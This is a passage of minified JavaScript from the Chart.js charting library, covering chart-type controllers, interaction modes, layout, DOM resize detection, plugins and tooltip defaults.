[{ type: "category", position: "left", categoryPercentage: .8, barPercentage: .9, offset: !0, gridLines: { offsetGridLines: !0 } }] }, elements: { rectangle: { borderSkipped: "left" } }, tooltips: { mode: "index", axis: "y" } }); var Kt = Ot.extend({ _getValueScaleId: function () { return this.getMeta().xAxisID }, _getIndexScaleId: function () { return this.getMeta().yAxisID } }), Jt = lt.valueOrDefault, jt = lt.options.resolve, $t = lt.canvas._isPointInArea; function qt(t, e) { return Jt(t.showLine, e.showLines) } st._set("line", { showLines: !0, spanGaps: !1, hover: { mode: "label" }, scales: { xAxes: [{ type: "category", id: "x-axis-0" }], yAxes: [{ type: "linear", id: "y-axis-0" }] } }); var te = Bt.extend({ datasetElementType: Tt.Line, dataElementType: Tt.Point, update: function (t) { var e, n, i = this.getMeta(), o = i.dataset, a = i.data || [], s = this.getScaleForId(i.yAxisID), r = this.getDataset(), g = qt(r, this.chart.options); for (g && (void 0 !== r.tension && void 0 === r.lineTension && (r.lineTension = r.tension), o._scale = s, o._datasetIndex = this.index, o._children = a, o._model = this._resolveLineOptions(o), o.pivot()), e = 0, n = a.length; e < n; ++e)this.updateElement(a[e], e, t); for (g && 0 !== o._model.tension && this.updateBezierControlPoints(), e = 0, n = a.length; e < n; ++e)a[e].pivot() }, updateElement: function (t, e, n) { var i = this.getMeta(), o = t.custom || {}, a = this.getDataset(), s = this.index, r = a.data[e], g = this.getScaleForId(i.yAxisID), l = this.getScaleForId(i.xAxisID), c = i.dataset._model, I = this._resolvePointOptions(t, e), u = l.getPixelForValue("object" == typeof r ? r : NaN, e, s), h = n ? g.getBasePixel() : this.calculatePointY(r, e, s); t._xScale = l, t._yScale = g, t._options = I, t._datasetIndex = s, t._index = e, t._model = { x: u, y: h, skip: o.skip || isNaN(u) || isNaN(h), radius: I.radius, pointStyle: I.pointStyle, rotation: I.rotation, backgroundColor: I.backgroundColor, borderColor: I.borderColor, borderWidth: I.borderWidth, tension: Jt(o.tension, c ? c.tension : 0), steppedLine: !!c && c.steppedLine, hitRadius: I.hitRadius } }, _resolvePointOptions: function (t, e) { for (var n, i = this.chart, o = i.data.datasets[this.index], a = t.custom || {}, s = i.options.elements.point, r = {}, g = { chart: i, dataIndex: e, dataset: o, datasetIndex: this.index }, l = { backgroundColor: "pointBackgroundColor", borderColor: "pointBorderColor", borderWidth: "pointBorderWidth", hitRadius: "pointHitRadius", hoverBackgroundColor: "pointHoverBackgroundColor", hoverBorderColor: "pointHoverBorderColor", hoverBorderWidth: "pointHoverBorderWidth", hoverRadius: "pointHoverRadius", pointStyle: "pointStyle", radius: "pointRadius", rotation: "pointRotation" }, c = Object.keys(l), I = 0, u = c.length; I < u; ++I)r[n = c[I]] = jt([a[n], o[l[n]], o[n], s[n]], g, e); return r }, _resolveLineOptions: function (t) { for (var e, n = this.chart, i = n.data.datasets[this.index], o = t.custom || {}, a = n.options, s = a.elements.line, r = {}, g = ["backgroundColor", "borderWidth", "borderColor", "borderCapStyle", "borderDash", "borderDashOffset", "borderJoinStyle", "fill", "cubicInterpolationMode"], l = 0, c = g.length; l < c; ++l)r[e = g[l]] = jt([o[e], i[e], s[e]]); return r.spanGaps = Jt(i.spanGaps, a.spanGaps), r.tension = Jt(i.lineTension, s.tension), r.steppedLine = jt([o.steppedLine, i.steppedLine, s.stepped]), r }, calculatePointY: function (t, e, n) { var i, o = this.chart, a = this.getMeta(), s = this.getScaleForId(a.yAxisID), r = 0, g = 0; if (s.options.stacked) { for (i = 0; i < n; i++) { var l, c, I = o.data.datasets[i]; "line" === (c = o.getDatasetMeta(i)).type && c.yAxisID === s.id && o.isDatasetVisible(i) && ((l = Number(s.getRightValue(I.data[e]))) < 0 ? g += l || 0 : r += l || 0) } var u = Number(s.getRightValue(t)); return u < 0 ? s.getPixelForValue(g + u) : s.getPixelForValue(r + u) } return s.getPixelForValue(t) }, updateBezierControlPoints: function () { var t, e, n, i, o = this.chart, a = this.getMeta(), s = a.dataset._model, r = o.chartArea, g = a.data || []; function l(t, e, n) { return Math.max(Math.min(t, n), e) } if (s.spanGaps && (g = g.filter(function (t) { return !t._model.skip })), "monotone" === s.cubicInterpolationMode) lt.splineCurveMonotone(g); else for (t = 0, e = g.length; t < e; ++t)n = g[t]._model, i = lt.splineCurve(lt.previousItem(g, t)._model, n, lt.nextItem(g, t)._model, s.tension), n.controlPointPreviousX = i.previous.x, n.controlPointPreviousY = i.previous.y, n.controlPointNextX = i.next.x, n.controlPointNextY = i.next.y; if (o.options.elements.line.capBezierPoints) for (t = 0, e = g.length; t < e; ++t)n = g[t]._model, $t(n, r) && (0 < t && $t(g[t - 1]._model, r) && (n.controlPointPreviousX = l(n.controlPointPreviousX, r.left, r.right), n.controlPointPreviousY = l(n.controlPointPreviousY, r.top, r.bottom)), t < g.length - 1 && $t(g[t + 1]._model, r) && (n.controlPointNextX = l(n.controlPointNextX, r.left, r.right), n.controlPointNextY = l(n.controlPointNextY, r.top, r.bottom))) }, draw: function () { var t, e = this.chart, n = this.getMeta(), i = n.data || [], o = e.chartArea, a = i.length, s = 0; for (qt(this.getDataset(), e.options) && (t = (n.dataset._model.borderWidth || 0) / 2, lt.canvas.clipArea(e.ctx, { left: o.left, right: o.right, top: o.top - t, bottom: o.bottom + t }), n.dataset.draw(), lt.canvas.unclipArea(e.ctx)); s < a; ++s)i[s].draw(o) }, setHoverStyle: function (t) { var e = t._model, n = t._options, i = lt.getHoverColor; t.$previousStyle = { backgroundColor: e.backgroundColor, borderColor: e.borderColor, borderWidth: e.borderWidth, radius: e.radius }, e.backgroundColor = Jt(n.hoverBackgroundColor, i(n.backgroundColor)), e.borderColor = Jt(n.hoverBorderColor, i(n.borderColor)), e.borderWidth = Jt(n.hoverBorderWidth, n.borderWidth), e.radius = Jt(n.hoverRadius, n.radius) } }), ee = lt.options.resolve; st._set("polarArea", { scale: { type: "radialLinear", angleLines: { display: !1 }, gridLines: { circular: !0 }, pointLabels: { display: !1 }, ticks: { beginAtZero: !0 } }, animation: { animateRotate: !0, animateScale: !0 }, startAngle: -.5 * Math.PI, legendCallback: function (t) { var e = []; e.push('<ul class="' + t.id + '-legend">'); var n = t.data, i = n.datasets, o = n.labels; if (i.length) for (var a = 0; a < i[0].data.length; ++a)e.push('<li><span style="background-color:' + i[0].backgroundColor[a] + '"></span>'), o[a] && e.push(o[a]), e.push("</li>"); return e.push("</ul>"), e.join("") }, legend: { labels: { generateLabels: function (s) { var r = s.data; return r.labels.length && r.datasets.length ? r.labels.map(function (t, e) { var n = s.getDatasetMeta(0), i = r.datasets[0], o = n.data[e].custom || {}, a = s.options.elements.arc; return { text: t, fillStyle: ee([o.backgroundColor, i.backgroundColor, a.backgroundColor], void 0, e), strokeStyle: ee([o.borderColor, i.borderColor, a.borderColor], void 0, e), lineWidth: ee([o.borderWidth, i.borderWidth, a.borderWidth], void 0, e), hidden: isNaN(i.data[e]) || n.data[e].hidden, index: e } }) : [] } }, onClick: function (t, e) { for (var n, i = e.index, o = this.chart, a = 0, s = (o.data.datasets || []).length; a < s; ++a)(n = o.getDatasetMeta(a)).data[i].hidden = !n.data[i].hidden; o.update() } }, tooltips: { callbacks: { title: function () { return "" }, label: function (t, e) { return e.labels[t.index] + ": " + t.yLabel } } } }); var ne = Bt.extend({ dataElementType: Tt.Arc, linkScales: lt.noop, update: function (t) { var e, n, i, o = this, a = o.getDataset(), s = o.getMeta(), r = o.chart.options.startAngle || 0, g = o._starts = [], l = o._angles = [], c = s.data; for (o._updateRadius(), s.count = o.countVisibleElements(), e = 0, n = a.data.length; e < n; e++)g[e] = r, i = o._computeAngle(e), r += l[e] = i; for (e = 0, n = c.length; e < n; ++e)c[e]._options = o._resolveElementOptions(c[e], e), o.updateElement(c[e], e, t) }, _updateRadius: function () { var t = this.chart, e = t.chartArea, n = t.options, i = Math.min(e.right - e.left, e.bottom - e.top); t.outerRadius = Math.max(i / 2, 0), t.innerRadius = Math.max(n.cutoutPercentage ? t.outerRadius / 100 * n.cutoutPercentage : 1, 0), t.radiusLength = (t.outerRadius - t.innerRadius) / t.getVisibleDatasetCount(), this.outerRadius = t.outerRadius - t.radiusLength * this.index, this.innerRadius = this.outerRadius - t.radiusLength }, updateElement: function (t, e, n) { var i = this.chart, o = this.getDataset(), a = i.options, s = a.animation, r = i.scale, g = i.data.labels, l = r.xCenter, c = r.yCenter, I = a.startAngle, u = t.hidden ? 0 : r.getDistanceFromCenterForValue(o.data[e]), h = this._starts[e], d = h + (t.hidden ? 0 : this._angles[e]), C = s.animateScale ? 0 : r.getDistanceFromCenterForValue(o.data[e]), A = t._options || {}; lt.extend(t, { _datasetIndex: this.index, _index: e, _scale: r, _model: { backgroundColor: A.backgroundColor, borderColor: A.borderColor, borderWidth: A.borderWidth, borderAlign: A.borderAlign, x: l, y: c, innerRadius: 0, outerRadius: n ? C : u, startAngle: n && s.animateRotate ? I : h, endAngle: n && s.animateRotate ? I : d, label: lt.valueAtIndexOrDefault(g, e, g[e]) } }), t.pivot() }, countVisibleElements: function () { var n = this.getDataset(), t = this.getMeta(), i = 0; return lt.each(t.data, function (t, e) { isNaN(n.data[e]) || t.hidden || i++ }), i }, setHoverStyle: function (t) { var e = t._model, n = t._options, i = lt.getHoverColor, o = lt.valueOrDefault; t.$previousStyle = { backgroundColor: e.backgroundColor, borderColor: e.borderColor, borderWidth: e.borderWidth }, e.backgroundColor = o(n.hoverBackgroundColor, i(n.backgroundColor)), e.borderColor = o(n.hoverBorderColor, i(n.borderColor)), e.borderWidth = o(n.hoverBorderWidth, n.borderWidth) }, _resolveElementOptions: function (t, e) { for (var n, i = this.chart, o = this.getDataset(), a = t.custom || {}, s = i.options.elements.arc, r = {}, g = { chart: i, dataIndex: e, dataset: o, datasetIndex: this.index }, l = ["backgroundColor", "borderColor", "borderWidth", "borderAlign", "hoverBackgroundColor", "hoverBorderColor", "hoverBorderWidth"], c = 0, I = l.length; c < I; ++c)r[n = l[c]] = ee([a[n], o[n], s[n]], g, e); return r }, _computeAngle: function (t) { var e = this.getMeta().count, n = this.getDataset(), i = this.getMeta(); if (isNaN(n.data[t]) || i.data[t].hidden) return 0; var o = { chart: this.chart, dataIndex: t, dataset: n, datasetIndex: this.index }; return ee([this.chart.options.elements.arc.angle, 2 * Math.PI / e], o, t) } }); st._set("pie", lt.clone(st.doughnut)), st._set("pie", { cutoutPercentage: 0 }); var ie = Pt, oe = lt.valueOrDefault, ae = lt.options.resolve; st._set("radar", { scale: { type: "radialLinear" }, elements: { line: { tension: 0 } } }); var se = Bt.extend({ datasetElementType: Tt.Line, dataElementType: Tt.Point, linkScales: lt.noop, update: function (t) { var e, n, i = this.getMeta(), o = i.dataset, a = i.data || [], s = this.chart.scale, r = this.getDataset(); for (void 0 !== r.tension && void 0 === r.lineTension && (r.lineTension = r.tension), o._scale = s, o._datasetIndex = this.index, o._children = a, o._loop = !0, o._model = this._resolveLineOptions(o), o.pivot(), e = 0, n = a.length; e < n; ++e)this.updateElement(a[e], e, t); for (this.updateBezierControlPoints(), e = 0, n = a.length; e < n; ++e)a[e].pivot() }, updateElement: function (t, e, n) { var i = t.custom || {}, o = this.getDataset(), a = this.chart.scale, s = a.getPointPositionForValue(e, o.data[e]), r = this._resolvePointOptions(t, e), g = this.getMeta().dataset._model, l = n ? a.xCenter : s.x, c = n ? a.yCenter : s.y; t._scale = a, t._options = r, t._datasetIndex = this.index, t._index = e, t._model = { x: l, y: c, skip: i.skip || isNaN(l) || isNaN(c), radius: r.radius, pointStyle: r.pointStyle, rotation: r.rotation, backgroundColor: r.backgroundColor, borderColor: r.borderColor, borderWidth: r.borderWidth, tension: oe(i.tension, g ? g.tension : 0), hitRadius: r.hitRadius } }, _resolvePointOptions: function (t, e) { for (var n, i = this.chart, o = i.data.datasets[this.index], a = t.custom || {}, s = i.options.elements.point, r = {}, g = { chart: i, dataIndex: e, dataset: o, datasetIndex: this.index }, l = { backgroundColor: "pointBackgroundColor", borderColor: "pointBorderColor", borderWidth: "pointBorderWidth", hitRadius: "pointHitRadius", hoverBackgroundColor: "pointHoverBackgroundColor", hoverBorderColor: "pointHoverBorderColor", hoverBorderWidth: "pointHoverBorderWidth", hoverRadius: "pointHoverRadius", pointStyle: "pointStyle", radius: "pointRadius", rotation: "pointRotation" }, c = Object.keys(l), I = 0, u = c.length; I < u; ++I)r[n = c[I]] = ae([a[n], o[l[n]], o[n], s[n]], g, e); return r }, _resolveLineOptions: function (t) { for (var e, n = this.chart, i = n.data.datasets[this.index], o = t.custom || {}, a = n.options.elements.line, s = {}, r = ["backgroundColor", "borderWidth", "borderColor", "borderCapStyle", "borderDash", "borderDashOffset", "borderJoinStyle", "fill"], g = 0, l = r.length; g < l; ++g)s[e = r[g]] = ae([o[e], i[e], a[e]]); return s.tension = oe(i.lineTension, a.tension), s }, updateBezierControlPoints: function () { var t, e, n, i, o = this.getMeta(), a = this.chart.chartArea, s = o.data || []; function r(t, e, n) { return Math.max(Math.min(t, n), e) } for (t = 0, e = s.length; t < e; ++t)n = s[t]._model, i = lt.splineCurve(lt.previousItem(s, t, !0)._model, n, lt.nextItem(s, t, !0)._model, n.tension), n.controlPointPreviousX = r(i.previous.x, a.left, a.right), n.controlPointPreviousY = r(i.previous.y, a.top, a.bottom), n.controlPointNextX = r(i.next.x, a.left, a.right), n.controlPointNextY = r(i.next.y, a.top, a.bottom) }, setHoverStyle: function (t) { var e = t._model, n = t._options, i = lt.getHoverColor; t.$previousStyle = { backgroundColor: e.backgroundColor, borderColor: e.borderColor, borderWidth: e.borderWidth, radius: e.radius }, e.backgroundColor = oe(n.hoverBackgroundColor, i(n.backgroundColor)), e.borderColor = oe(n.hoverBorderColor, i(n.borderColor)), e.borderWidth = oe(n.hoverBorderWidth, n.borderWidth), e.radius = oe(n.hoverRadius, n.radius) } }); st._set("scatter", { hover: { mode: "single" }, scales: { xAxes: [{ id: "x-axis-1", type: "linear", position: "bottom" }], yAxes: [{ id: "y-axis-1", type: "linear", position: "left" }] }, showLines: !1, tooltips: { callbacks: { title: function () { return "" }, label: function (t) { return "(" + t.xLabel + ", " + t.yLabel + ")" } } } }); var re = { bar: Ot, bubble: Lt, doughnut: Pt, horizontalBar: Kt, line: te, polarArea: ne, pie: ie, radar: se, scatter: te }; function ge(t, e) { return t.native ? { x: t.x, y: t.y } : lt.getRelativePosition(t, e) } function le(t, e) { for (var n, i, o, a = 0, s = t.data.datasets.length; a < s; ++a)if (t.isDatasetVisible(a)) for (i = 0, o = (n = t.getDatasetMeta(a)).data.length; i < o; ++i) { var r = n.data[i]; r._view.skip || e(r) } } function ce(t, e) { var n = []; return le(t, function (t) { t.inRange(e.x, e.y) && n.push(t) }), n } function Ie(t, i, o, a) { var s = Number.POSITIVE_INFINITY, r = []; return le(t, function (t) { var e, n; o && !t.inRange(i.x, i.y) || (e = t.getCenterPoint(), (n = a(i, e)) < s ? (r = [t], s = n) : n === s && r.push(t)) }), r } function ue(t) { var o = -1 !== t.indexOf("x"), a = -1 !== t.indexOf("y"); return function (t, e) { var n = o ? Math.abs(t.x - e.x) : 0, i = a ? Math.abs(t.y - e.y) : 0; return Math.sqrt(Math.pow(n, 2) + Math.pow(i, 2)) } } function he(i, t, e) { var n = ge(t, i); e.axis = e.axis || "x"; var o = ue(e.axis), a = e.intersect ? ce(i, n) : Ie(i, n, !1, o), s = []; return a.length ? (i.data.datasets.forEach(function (t, e) { var n; !i.isDatasetVisible(e) || (n = i.getDatasetMeta(e).data[a[0]._index]) && !n._view.skip && s.push(n) }), s) : [] } var de = { modes: { single: function (t, e) { var n = ge(e, t), i = []; return le(t, function (t) { return t.inRange(n.x, n.y) && (i.push(t), i) }), i.slice(0, 1) }, label: he, index: he, dataset: function (t, e, n) { var i = ge(e, t); n.axis = n.axis || "xy"; var o = ue(n.axis), a = n.intersect ? ce(t, i) : Ie(t, i, !1, o); return 0 < a.length && (a = t.getDatasetMeta(a[0]._datasetIndex).data), a }, "x-axis": function (t, e) { return he(t, e, { intersect: !1 }) }, point: function (t, e) { return ce(t, ge(e, t)) }, nearest: function (t, e, n) { var i = ge(e, t); n.axis = n.axis || "xy"; var o = ue(n.axis); return Ie(t, i, n.intersect, o) }, x: function (t, e, n) { var i = ge(e, t), o = [], a = !1; return le(t, function (t) { t.inXRange(i.x) && o.push(t), t.inRange(i.x, i.y) && (a = !0) }), n.intersect && !a && (o = []), o }, y: function (t, e, n) { var i = ge(e, t), o = [], a = !1; return le(t, function (t) { t.inYRange(i.y) && o.push(t), t.inRange(i.x, i.y) && (a = !0) }), n.intersect && !a && (o = []), o } } }; function Ce(t, e) { return lt.where(t, function (t) { return t.position === e }) } function Ae(t, o) { t.forEach(function (t, e) { return t._tmpIndex_ = e, t }), t.sort(function (t, e) { var n = o ? e : t, i = o ? t : e; return n.weight === i.weight ? n._tmpIndex_ - i._tmpIndex_ : n.weight - i.weight }), t.forEach(function (t) { delete t._tmpIndex_ }) } function pe(t, e) { lt.each(t, function (t) { e[t.position] += t.isHorizontal() ? t.height : t.width }) } st._set("global", { layout: { padding: { top: 0, right: 0, bottom: 0, left: 0 } } }); var me = { defaults: {}, addBox: function (t, e) { t.boxes || (t.boxes = []), e.fullWidth = e.fullWidth || !1, e.position = e.position || "top", e.weight = e.weight || 0, t.boxes.push(e) }, removeBox: function (t, e) { var n = t.boxes ? t.boxes.indexOf(e) : -1; -1 !== n && t.boxes.splice(n, 1) }, configure: function (t, e, n) { for (var i, o = ["fullWidth", "position", "weight"], a = o.length, s = 0; s < a; ++s)i = o[s], n.hasOwnProperty(i) && (e[i] = n[i]) }, update: function (e, n, t) { var i, o, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b, B, y, v, x, F, Q, G, w, X, S, k, D, Z, U, W; function N(e) { var t, n = lt.findNextWhere(v, function (t) { return t.box === e }); n && (n.horizontal ? (t = { left: Math.max(y.left, x.left), right: Math.max(y.right, x.right), top: 0, bottom: 0 }, e.update(e.fullWidth ? p : b, m / 2, t)) : e.update(n.width, B)) } function T(t) { t.isHorizontal() ? (t.left = t.fullWidth ? a : y.left, t.right = t.fullWidth ? n - s : y.left + b, t.top = W, t.bottom = W + t.height, W = t.bottom) : (t.left = U, t.right = U + t.width, t.top = y.top, t.bottom = y.top + B, U = t.right) } e && (i = e.options.layout || {}, o = lt.options.toPadding(i.padding), a = o.left, s = o.right, r = o.top, g = o.bottom, l = Ce(e.boxes, "left"), c = Ce(e.boxes, "right"), I = Ce(e.boxes, "top"), u = Ce(e.boxes, "bottom"), h = Ce(e.boxes, "chartArea"), Ae(l, !0), Ae(c, !1), Ae(I, !0), Ae(u, !1), d = l.concat(c), C = I.concat(u), A = d.concat(C), m = t - r - g, f = (n - (p = n - a - s) / 2) / d.length, b = p, B = m, y = { top: r, left: a, bottom: g, right: s }, v = [], lt.each(A, function (t) { var e, n = t.isHorizontal(); n ? (e = t.update(t.fullWidth ? p : b, m / 2), B -= e.height) : (e = t.update(f, B), b -= e.width), v.push({ horizontal: n, width: e.width, box: t }) }), F = A, X = w = G = Q = 0, lt.each(F, function (t) { var e; t.getPadding && (e = t.getPadding(), Q = Math.max(Q, e.top), G = Math.max(G, e.left), w = Math.max(w, e.bottom), X = Math.max(X, e.right)) }), x = { top: Q, left: G, bottom: w, right: X }, lt.each(d, N), pe(d, y), lt.each(C, N), pe(C, y), lt.each(d, function (e) { var t = lt.findNextWhere(v, function (t) { return t.box === e }), n = { left: 0, right: 0, top: y.top, bottom: y.bottom }; t && e.update(t.width, B, n) }), pe(A, y = { top: r, left: a, bottom: g, right: s }), S = Math.max(x.left - y.left, 0), y.left += S, y.right += Math.max(x.right - y.right, 0), k = Math.max(x.top - y.top, 0), y.top += k, y.bottom += Math.max(x.bottom - y.bottom, 0), D = t - y.top - y.bottom, (Z = n - y.left - y.right) === b && D === B || (lt.each(d, function (t) { t.height = D }), lt.each(C, function (t) { t.fullWidth || (t.width = Z) }), B = D, b = Z), U = a + S, W = r + k, lt.each(l.concat(I), T), U += b, W += B, lt.each(c, T), lt.each(u, T), e.chartArea = { left: y.left, top: y.top, right: y.left + b, bottom: y.top + B }, lt.each(h, function (t) { t.left = e.chartArea.left, t.top = e.chartArea.top, t.right = e.chartArea.right, t.bottom = e.chartArea.bottom, t.update(b, B) })) } }; function Ya() { throw new Error("Dynamic requires are not currently supported by rollup-plugin-commonjs") } var fe, be = (fe = Object.freeze({ default: "/*\n * DOM element rendering detection\n * https://davidwalsh.name/detect-node-insertion\n */\n@keyframes chartjs-render-animation {\n\tfrom { opacity: 0.99; }\n\tto { opacity: 1; }\n}\n\n.chartjs-render-monitor {\n\tanimation: chartjs-render-animation 0.001s;\n}\n\n/*\n * DOM element resizing detection\n * https://github.com/marcj/css-element-queries\n */\n.chartjs-size-monitor,\n.chartjs-size-monitor-expand,\n.chartjs-size-monitor-shrink {\n\tposition: absolute;\n\tdirection: ltr;\n\tleft: 0;\n\ttop: 0;\n\tright: 0;\n\tbottom: 0;\n\toverflow: hidden;\n\tpointer-events: none;\n\tvisibility: hidden;\n\tz-index: -1;\n}\n\n.chartjs-size-monitor-expand > div {\n\tposition: absolute;\n\twidth: 1000000px;\n\theight: 1000000px;\n\tleft: 0;\n\ttop: 0;\n}\n\n.chartjs-size-monitor-shrink > div {\n\tposition: absolute;\n\twidth: 200%;\n\theight: 200%;\n\tleft: 0;\n\ttop: 0;\n}\n" })) && fe.default || fe, Be = "$chartjs", ye = "chartjs-", ve = ye + "size-monitor", xe = ye + "render-monitor", Fe = ye + "render-animation", Qe = ["animationstart", "webkitAnimationStart"], Ge = { touchstart: "mousedown", touchmove: "mousemove", touchend: "mouseup", pointerenter: "mouseenter", pointerdown: "mousedown", pointermove: "mousemove", pointerup: "mouseup", pointerleave: "mouseout", pointerout: "mouseout" }; function we(t, e) { var n = lt.getStyle(t, e), i = n && n.match(/^(\d+)(\.\d+)?px$/); return i ? Number(i[1]) : void 0 } var Xe = !!function () { var t = !1; try { var e = Object.defineProperty({}, "passive", { get: function () { t = !0 } }); window.addEventListener("e", null, e) } catch (t) { } return t }() && { passive: !0 }; function Se(t, e, n) { t.addEventListener(e, n, Xe) } function ke(t, e, n) { t.removeEventListener(e, n, Xe) } function De(t, e, n, i, o) { return { type: t, chart: e, native: o || null, x: void 0 !== n ? n : null, y: void 0 !== i ? i : null } } function Ze(t) { var e = document.createElement("div"); return e.className = t || "", e } function Ue(n, i, o) { var t, e, a, s, r, g, l, c, I, u, h, d, C = n[Be] || (n[Be] = {}), A = C.resizer = (l = !(r = function () { var t, e; C.resizer && (e = (t = o.options.maintainAspectRatio && n.parentNode) ? t.clientWidth : 0, i(De("resize", o)), t && t.clientWidth < e && o.canvas && i(De("resize", o))) }), c = [], t = function () { c = Array.prototype.slice.call(arguments), g = g || this, l || (l = !0, lt.requestAnimFrame.call(window, function () { l = !1, r.apply(g, c) })) }, e = Ze(ve), a = Ze(ve + "-expand"), s = Ze(ve + "-shrink"), a.appendChild(Ze()), s.appendChild(Ze()), e.appendChild(a), e.appendChild(s), e._reset = function () { a.scrollLeft = 1e6, a.scrollTop = 1e6, s.scrollLeft = 1e6, s.scrollTop = 1e6 }, Se(a, "scroll", p.bind(a, "expand")), Se(s, "scroll", p.bind(s, "shrink")), e); function p() { e._reset(), t() } u = function () { var t; C.resizer && ((t = n.parentNode) && t !== A.parentNode && t.insertBefore(A, t.firstChild), A._reset()) }, h = (I = n)[Be] || (I[Be] = {}), d = h.renderProxy = function (t) { t.animationName === Fe && u() }, lt.each(Qe, function (t) { Se(I, t, d) }), h.reflow = !!I.offsetParent, I.classList.add(xe) } function We(t) { var e, n, i, o = t[Be] || {}, a = o.resizer; delete o.resizer, n = (e = t)[Be] || {}, (i = n.renderProxy) && (lt.each(Qe, function (t) { ke(e, t, i) }), delete n.renderProxy), e.classList.remove(xe), a && a.parentNode && a.parentNode.removeChild(a) } var Ne = { disableCSSInjection: !1, _enabled: "undefined" != typeof window && "undefined" != typeof document, _ensureLoaded: function () { var t, e, n; this._loaded || (this._loaded = !0, this.disableCSSInjection || (e = be, n = (t = this)._style || document.createElement("style"), t._style || (e = "/* Chart.js */\n" + e, (t._style = n).setAttribute("type", "text/css"), document.getElementsByTagName("head")[0].appendChild(n)), n.appendChild(document.createTextNode(e)))) }, acquireContext: function (t, e) { "string" == typeof t ? t = document.getElementById(t) : t.length && (t = t[0]), t && t.canvas && (t = t.canvas); var n, i, o, a, s, r, g, l = t && t.getContext && t.getContext("2d"); return this._ensureLoaded(), l && l.canvas === t ? (i = e, s = (n = t).style, r = n.getAttribute("height"), g = n.getAttribute("width"), n[Be] = { initial: { height: r, width: g, style: { display: s.display, height: s.height, width: s.width } } }, s.display = s.display || "block", null !== g && "" !== g || void 0 !== (o = we(n, "width")) && (n.width = o), null !== r && "" !== r || ("" === n.style.height ? n.height = n.width / (i.options.aspectRatio || 2) : (a = we(n, "height"), void 0 !== o && (n.height = a))), l) : null }, releaseContext: function (t) { var n, i = t.canvas; i[Be] && (n = i[Be].initial, ["height", "width"].forEach(function (t) { var e = n[t]; lt.isNullOrUndef(e) ? i.removeAttribute(t) : i.setAttribute(t, e) }), lt.each(n.style || {}, function (t, e) { i.style[e] = t }), i.width, delete i[Be]) }, addEventListener: function (a, t, s) { var e, n = a.canvas; "resize" !== t ? Se(n, t, ((e = s[Be] || (s[Be] = {})).proxies || (e.proxies = {}))[a.id + "_" + t] = function (t) { var e, n, i, o; s((n = a, i = Ge[(e = t).type] || e.type, o = lt.getRelativePosition(e, n), De(i, n, o.x, o.y, e))) }) : Ue(n, s, a) }, removeEventListener: function (t, e, n) { var i, o = t.canvas; "resize" !== e ? (i = ((n[Be] || {}).proxies || {})[t.id + "_" + e]) && ke(o, e, i) : We(o) } }; lt.addEvent = Se, lt.removeEvent = ke; var Te = Ne._enabled ? Ne : { acquireContext: function (t) { return t && t.canvas && (t = t.canvas), t && t.getContext("2d") || null } }, He = lt.extend({ initialize: function () { }, acquireContext: function () { }, releaseContext: function () { }, addEventListener: function () { }, removeEventListener: function () { } }, Te); st._set("global", { plugins: {} }); var Ee = { _plugins: [], _cacheId: 0, register: function (t) { var e = this._plugins;[].concat(t).forEach(function (t) { -1 === e.indexOf(t) && e.push(t) }), this._cacheId++ }, unregister: function (t) { var n = this._plugins;[].concat(t).forEach(function (t) { var e = n.indexOf(t); -1 !== e && n.splice(e, 1) }), this._cacheId++ }, clear: function () { this._plugins = [], this._cacheId++ }, count: function () { return this._plugins.length }, getAll: function () { return this._plugins }, notify: function (t, e, n) { for (var i, o, a, s, r = this.descriptors(t), g = r.length, l = 0; l < g; ++l)if ("function" == typeof (s = (o = (i = r[l]).plugin)[e]) && ((a = [t].concat(n || [])).push(i.options), !1 === s.apply(o, a))) return !1; return !0 }, descriptors: function (t) { var e = t.$plugins || (t.$plugins = {}); if (e.id === this._cacheId) return e.descriptors; var i = [], o = [], n = t && t.config || {}, a = n.options && n.options.plugins || {}; return this._plugins.concat(n.plugins || []).forEach(function (t) { var e, n; -1 === i.indexOf(t) && (e = t.id, !1 !== (n = a[e]) && (!0 === n && (n = lt.clone(st.global.plugins[e])), i.push(t), o.push({ plugin: t, options: n || {} }))) }), e.descriptors = o, e.id = this._cacheId, o }, _invalidate: function (t) { delete t.$plugins } }, Re = { constructors: {}, defaults: {}, registerScaleType: function (t, e, n) { this.constructors[t] = e, this.defaults[t] = lt.clone(n) }, getScaleConstructor: function (t) { return this.constructors.hasOwnProperty(t) ? this.constructors[t] : void 0 }, getScaleDefaults: function (t) { return this.defaults.hasOwnProperty(t) ? lt.merge({}, [st.scale, this.defaults[t]]) : {} }, updateScaleDefaults: function (t, e) { this.defaults.hasOwnProperty(t) && (this.defaults[t] = lt.extend(this.defaults[t], e)) }, addScalesToLayout: function (e) { lt.each(e.scales, function (t) { t.fullWidth = t.options.fullWidth, t.position = t.options.position, t.weight = t.options.weight, me.addBox(e, t) }) } }, Ye = lt.valueOrDefault; st._set("global", { tooltips: { enabled: !0, custom: null, mode: "nearest", position: "average", intersect: !0, backgroundColor: "rgba(0,0,0,0.8)", titleFontStyle: "bold", titleSpacing: 2, titleMarginBottom: 6, titleFontColor: "#fff", titleAlign: "left", bodySpacing: 2, bodyFontColor: "#fff", bodyAlign: "left", footerFontStyle: "bold", footerSpacing: 2, footerMarginTop: 6, footerFontColor: "#fff", footerAlign: "left", yPadding: 6, xPadding: 6, caretPadding: 2, caretSize: 5, cornerRadius: 6, multiKeyBackground: "#fff", displayColors: !0, borderColor: "rgba(0,0,0,0)", borderWidth: 0, callbacks: { beforeTitle: lt.noop, title: function (t, e) { var n, i = "", o = e.labels, a = o ? o.length : 0; return 0 < t.length && ((n = t[0]).label ? i = n.label : n.xLabel ? i = n.xLabel : 0 < a && n.index < a && (i = o[n.index])), i }, afterTitle: lt.noop, beforeBody: lt.noop, beforeLabel: lt.noop, label: function (t, e) { var n = e.datasets[t.datasetIndex].label || ""; return n && (n += ": "), lt.isNullOrUndef(t.value) ? n += t.yLabel : n += t.value, n }, labelColor: function (t, e) { var n = e.getDatasetMeta(t.datasetIndex).data[t.index]._view; return { borderColor: n.borderColor, backgroundColor: n.backgroundColor } }, labelTextColor: function () { return this._options.bodyFontColor }, afterLabel: lt.noop, afterBody: lt.noop, beforeFooter: lt.noop, footer: lt.noop, afterFooter: lt.noop } } }); var Oe = { average: function (t) { if (!t.length) return !1; for (var e = 0, n = 0, i = 0, o = 0, a = t.length; o < a; ++o) { var s, r = t[o]; r && r.hasValue() && (e += (s = r.tooltipPosition()).x, n += s.y, ++i) } return { x: e / i, y: n / i } }, nearest: function (t, e) { for (var n, i, o = e.x, a = e.y, s = Number.POSITIVE_INFINITY, r = 0, g = t.length; r < g; ++r) { var l, c, I = t[r]; I && 